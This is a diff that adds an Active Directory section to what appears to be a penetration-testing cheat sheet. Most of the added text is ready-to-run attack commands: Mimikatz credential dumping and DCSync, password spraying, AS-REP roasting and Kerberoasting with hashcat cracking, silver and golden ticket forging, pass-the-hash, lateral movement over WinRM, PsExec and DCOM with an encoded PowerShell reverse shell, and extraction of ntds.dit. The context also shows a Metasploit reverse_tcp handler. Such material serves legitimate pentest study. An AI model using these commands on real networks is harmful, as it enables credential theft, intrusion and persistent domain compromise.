@@ -183,6 +183,20 @@ I try as much as possible to link to the various sources or inspiration for thes
     - [ToDo](#todo)
     - [Thread Injection](#thread-injection)
     - [Shellter](#shellter)
+  - [Active Directory](#active-directory)
+    - [Notes](#notes-2)
+    - [Manual Enumeration](#manual-enumeration)
+    - [PowerView](#powerview)
+    - [PsLoggedOn](#psloggedon)
+    - [Service Principal Names Enumeration](#service-principal-names-enumeration)
+    - [Object Permissions Enumeration](#object-permissions-enumeration)
+    - [Domain Shares Enumeration](#domain-shares-enumeration)
+    - [SharpHound](#sharphound)
+    - [BloodHound](#bloodhound)
+    - [Mimikatz](#mimikatz)
+    - [Active Directory Authentication Attacks](#active-directory-authentication-attacks)
+    - [Lateral Movement Techniques](#lateral-movement-techniques)
+    - [Active Directory Persistence](#active-directory-persistence)
 - [Mobile](#mobile)
   - [Missing Certificate and Public Key Pinning](#missing-certificate-and-public-key-pinning)
   - [Cordova attacks](#cordova-attacks)
@@ -4637,6 +4651,297 @@ Example of usage
 7. Create a listener in Kali with Metasploit
    - `msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <IP>;set LPORT <PORT>;run;"`
 8. Get the meterpreter shell on the attacking machine
+
+
+### <ins>Active Directory</ins>
+
+#### <ins>Notes</ins>
+- See also [Cheat Sheet - Active Directory](https://github.com/drak3hft7/Cheat-Sheet---Active-Directory)
+- Check for `Domain Admins` and `Service Accounts` groups
+- Add an account to a group
+  - `net group "<group>" <user> /add /domain`
+  - Verify the success of the command with `Get-NetGroup "<group>" | select member`
+  - Delete the `<user>` with `/del` instead of `/add`
+- Use `gpp-decrypt` to decrypt a given GPP encrypted string
+- Note `ActiveDirectoryRights` and `SecurityIdentifier` for each object enumerated during [Object Permissions Enumeration](#bbject-permissions-enumeration)
+- The highest permission is `GenericAll`. Note also `GenericWrite`, `WriteOwner`, `WriteDACL`, `AllExtendedRights`, `ForceChangePassword`, `Self (Self-Membership)`
+  - See: [ActiveDirectoryRights Enum (System.DirectoryServices)](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
+
+| Server | Algorithm available |
+| ---    | ---                 |
+| Windows 2003 | NTLM |
+| Windows Server 2008 or later | NTLM and SHA-1 |
+| - Old Windows OS (like Windows 7)<br/> - OS that have it manually set | [WDigest](https://technet.microsoft.com/en-us/library/cc778868(v=ws.10).aspx) |
+
+
+
+#### <ins>Manual Enumeration</ins>
+
+#### Legacy Windows applications
+
+```
+net user /domain                       display users in the domain
+net user <username> /domain            net-user against a specific user
+net group /domain                      enumerate groups in the domain
+net group "<group-name>" /domain       display members in specific group
+```
+
+#### PowerShell and .NET
+
+```
+LDAP://host[:port][/DistinguishedName]                                      LDAP path format. CN = Common Name; DC = Domain Component;
+[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()       domain class from System.DirectoryServices.ActiveDirectory namespace
+powershell -ep bypass                                                       bypass the execution policy
+([adsi]'').distinguishedName                                                obtain the DN for the domain
+```
+
+#### <ins>PowerView</ins>
+
+```
+Import-Module .\PowerView.ps1                                                                                                             Import PowerView; https://powersploit.readthedocs.io/en/latest/Recon/
+Get-NetDomain                                                                                                                             Obtain domain information
+Get-NetUser | select cn,pwdlastset,lastlogon                                                                                              Obtain users in the domain; username only
+Get-NetGroup | select cn                                                                                                                  Obtain groups in the domain
+Get-NetGroup "GROUP-NAME" | select member                                                                                                 Enumerate a specific group
+Get-NetComputer                                                                                                                           Enumerate the computer objects in the domain
+Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion                                                               Display OS and hostname
+Find-LocalAdminAccess                                                                                                                     Scan domain to find local administrative privileges for our user
+Get-NetSession -ComputerName INPUT -Verbose                                                                                               Check logged on users with Get-NetSession
+Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl                                                   Display permissions on the DefaultSecurity registry hive
+
+Object Permissions Enumeration
+------------------------------
+Get-ObjectAcl -Identity <username>                                                                                                        Enumerate ACEs
+Convert-SidToName <SID>                                                                                                                   Convert ObjectISD and SecurityIdentifier into names
+"<SID>", "<SID>", "<SID>", "<SID>", ... | Convert-SidToName                                                                               Convert <SID>s into names
+Get-ObjectAcl -Identity "<group>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights       Enumerat ACLs for <group>, only display values equal to GenericAll
+
+Domain Shares Enumeration
+-------------------------
+Find-DomainShare                                                                                                                          Find Domain Shares
+```
+
+#### <ins>PsLoggedOn</ins>
+
+Download: [PsLoggedOn - Sysinternals | Microsoft Learn](https://learn.microsoft.com/en-us/sysinternals/downloads/psloggedon)
+```
+.\PsLoggedon.exe \\COMPUTERNAME       See user logons at COMPUTERNAME
+```
+
+#### <ins>Service Principal Names Enumeration</ins>
+
+```
+setspn -L <username>                                                List the SPNs connected to a certain user account
+Get-NetUser -SPN | select samaccountname,serviceprincipalname       List the SPNs accounts in the domain
+```
+
+#### <ins>Object Permissions Enumeration</ins>=
+```
+Get-ObjectAcl -Identity <username>                                                                                                        Enumerate ACEs
+Convert-SidToName <SID>                                                                                                                   Convert ObjectISD and SecurityIdentifier into names
+"<SID>", "<SID>", "<SID>", "<SID>", ... | Convert-SidToName                                                                               Convert <SID>s into names
+Get-ObjectAcl -Identity "<group>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights       Enumerat ACLs for <group>, only display values equal to GenericAll
+```
+
+#### <ins>Domain Shares Enumeration</ins>
+
+```
+Find-DomainShare       Find Domain Shares
+```
+
+#### <ins>SharpHound</ins>
+
+```
+Import-Module .\Sharphound.ps1                                                                  Import SharpHound; https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1
+Get-Help Invoke-BloodHound                                                                      Learn more about Invoke-BloodHound; To run SharpHound you must first start BloodHound
+Invoke-BloodHound -CollectionMethod All -OutputDirectory <DIR> -OutputPrefix "corp audit"       Collect domain data
+```
+
+#### <ins>BloodHound</ins>
+
+- Note: you need to start Neo4j first with `sudo neo4j start` and then use the command `bloodhound` to start BloodHound.
+- Default credentials for Neo4j: `neo4j:neo4j`
+- Log in BloodHound with Neo4j's credentials
+- Upload here the zip created with SharpHound
+- Pre-built queries
+  - Find Workstations where Domain Users can RDP
+  - Find Servers where Domain Users can RDP
+  - Find Computers where Domain Users are Local Admin
+  - Shortest Path to Domain Admins from Owned Principals
+- Custom queries
+  - `MATCH (m:Computer) RETURN m`  to display all computers
+  - `MATCH p = (c:Computer)-[:HasSession]->(m:User) RETURN p` to display all active sessions
+
+#### <ins>Mimikatz</ins>
+After starting `mimikatz.exe`, run the command `privilege::debug` to enable `SeDebugPrivilege`
+```
+sekurlsa::logonpasswords                                                           Dump the credentials of all logged-on users
+sekurlsa::tickets                                                                  Tickets stored in memory
+crypto::capi                                                                       Make non-exportable keys exportable; CryptoAPI function
+crypto::cng                                                                        Make non-exportable keys exportable; KeyIso service
+lsadump::dcsync /user:<domain>\<user>                                              Domain Controller Synchronization
+sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:powershell       Overpass the Hash
+```
+
+#### <ins>Active Directory Authentication Attacks</ins>
+
+#### Password Attacks
+
+With LDAP and ADSI
+- Before any attack, check `net accounts` to learn more about account lockouts
+- Use the script [Spray-Passwords.ps1](https://web.archive.org/web/20220225190046/https://github.com/ZilentJack/Spray-Passwords/blob/master/Spray-Passwords.ps1)
+  - Search wich user has the password `SecretPass123!` with `.\Spray-Passwords.ps1 -Pass SecretPass123! -Admin`
+  - Remember to run `powershell -ep bypass` before using scripts
+
+Leveraging SMB
+- `crackmapexec smb <IP> -u users.txt -p 'SecretPass123!' -d <domain-name> --continue-on-success` Password spraying
+- `crackmapexec smb <domain_name>/<username>:'abd132' -M targets.txt` Spray a specified password `abd132` against all domain joined machines contained in `targets.txt`
+- Note: this doesn't take in consideration the password policy of the domain
+
+By obtaining a TGT
+- It's possible to use kinit to obtain and cache a Kerberos TGT and automate the process with a script
+- It's also possible to use [kerbrute](https://github.com/ropnop/kerbrute) instead
+  - `.\kerbrute_windows_amd64.exe passwordspray -d <domain-name> .\usernames.txt "SecretPass123!"`
+
+#### AS-REP Roasting
+
+On Linux
+1. `impacket-GetNPUsers -dc-ip <IP-Domain-Controller> -request -outputfile <outuput_file.asreproast> <domain>/<user>` perform AS-REP roasting
+2. `sudo hashcat -m 18200 outuput_file.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` crack the AS-REP hash
+
+On Windows
+1. With [Rubeus](https://github.com/GhostPack/Rubeus), `.\Rubeus.exe asreproast /nowrap` perform AS-REP roasting
+2. `sudo hashcat -m 18200 outuput_file.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` crack the AS-REP hash
+
+#### Kerberoasting
+
+On Linux
+1. `sudo impacket-GetUserSPNs -request -dc-ip <IP-Domain-Controller> <domain>/<user>` perform Kerberoasting
+2. `sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` crack the TGS-REP hash
+
+On Windows
+1. With [Rubeus](https://github.com/GhostPack/Rubeus), `.\Rubeus.exe kerberoast /outfile:hashes.kerberoast` perform Kerberoasting
+2. `sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force` crack the TGS-REP hash
+
+#### Silver Tickets
+
+To create a silver ticket, you need:
+- SPN password hash
+- Domain SID
+- Target SPN
+
+1. With mimikatz, run the commands `privilege::debug` and `sekurlsa::logonpasswords` to extract cached AD credentials. Note the NTLM hash of the target user
+2. Run on the PowerShell the command `whoami /user` to obtain the domain SID (omit the last 4 digits). Note: you should be able to find it also in the previous step
+3. Target an SPN
+4. Run `kerberos::golden /sid:<SID> /domain:<DOMAIN> /ptt /target:<TARGET> /service:<SERVICE> /rc4:<NTLM-HASH> /user:<USER>`
+5. Confirm that you have the ticket ready to use in memory with `klist`
+
+#### Domain Controller Synchronization
+
+On Linux
+1. `impacket-secretsdump -just-dc-user <target-user> <domain>/<user>:"<password>"@<IP>`
+2. Crack the NTLM hash with `hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
+
+On Windows
+1. In mimikatz, run the command `lsadump::dcsync /user:<domain>\<user>`, note the Hash NTLM
+2. Crack the NTLM hash with `hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`
+
+
+#### <ins>Lateral Movement Techniques</ins>
+
+#### WMI and WinRM
+
+1. Create a PSCredential object that stores session's username and password
+   ```PowerShell
+   $username = '<username>';
+   $password = '<password>';
+   $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+   $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+   ```
+2. Create a Common Information Model
+   ```PowerShell
+   $options = New-CimSessionOption -Protocol DCOM
+   $session = New-Cimsession -ComputerName <IP> -Credential $credential -SessionOption $Options 
+   $command = 'calc';
+   ```
+3. Tie all together with `Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};`
+
+Another lateral movement
+- `winrs -r:<target> -u:<username> -p:<password>  "cmd /c hostname & whoami"`
+- `winrs -r:<target> -u:<username> -p:<password>  "powershell -nop -w hidden -e <BASE64>"`
+
+PowerShell remoting
+```PowerShell
+$username = '<username>';
+$password = '<password>';
+$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
+New-PSSession -ComputerName <IP> -Credential $credential
+```
+- To interact with the session, run the command `Enter-PSSession <SESSION-ID>`
+
+#### PsExec
+```PowerShell
+./PsExec64.exe -i  \\<TARGET> -u <DOMAIN>\<USERNAME> -p <PASSWORD> cmd
+```
+Requirements
+- The user that authenticates to the target machine needs to be part of the Administrators local group
+- An SMB connection through the firewall
+- The `ADMIN$` share must be available
+- File and Printer Sharing has to be turned on
+
+#### Pass the Hash
+```PowerShell
+/usr/bin/impacket-wmiexec -hashes :<hash> <username>@<IP>
+```
+Requirements
+- An SMB connection through the firewall
+- The `ADMIN$` share must be available
+- The attacker must present valid credentials with local administrative permission
+
+#### Overpass the Hash
+
+1. Run the Notepad with `Run as different user` to cache the credentials on the machine
+2. Run mimikatz. Execute the commands `privilege::debug` and `sekurlsa::logonpasswords` to dump the password hash for the user just used
+3. Now, in mimikatz, execute the command `sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:powershell` to run a PowerShell
+4. Authenticate to a network share of the target `net use \\<target>`
+5. Use `klist` to notice the newly requested Kerberos tickets, including a TGT and a TGS for the Common Internet File System (CIFS)
+6. Now you can run `.\PsExec.exe \\<target> cmd`
+
+#### Pass the Ticket
+
+1. Verify that you are not able to access to a restricted shared folder
+2. Run mimikatz. Execute `#privilege::debug`
+3. `#sekurlsa::tickets /export` export all the TGT/TGS from memory
+4. Verify generated tickets with `PS:\> dir *.kirbi`
+5. Inject a ticket from mimikatz with `kerberos::ptt <ticket_name>`
+6. Inspect the injected ticket with `C:\> klist`
+7. Access the restricted shared folder
+
+
+#### DCOM
+
+1. `$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<IP>"))` remotely Instantiate the MMC Application object
+2. `$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")` execute a command on the remote DCOM object
+3. `$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <BASE64>","7")` reverse shell, run a listener with `nc -lnvp 443`
+
+
+#### <ins>Active Directory Persistence</ins>
+
+#### Golden Ticket
+
+1. Run mimikatz, execute the command `privilege::debug`
+2. `lsadump::lsa /patch` dump the krbtgt password hash
+3. Run `kerberos::purge`
+4. `kerberos::golden /user:<USER> /domain:corp.com /sid:<SID> /krbtgt:<NTLM> /ptt` inject the golden ticket
+
+
+#### Shadow copies
+
+1. `vshadow.exe -nw -p  C:` perform a shadow copy of the `C:` drive
+2. `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak` copy the ntds database to the C: drive
+3. `reg.exe save hklm\system c:\system.bak` save the SYSTEM hive from the Windows registry
+4. `impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL` extract the credential materials
 
 
 
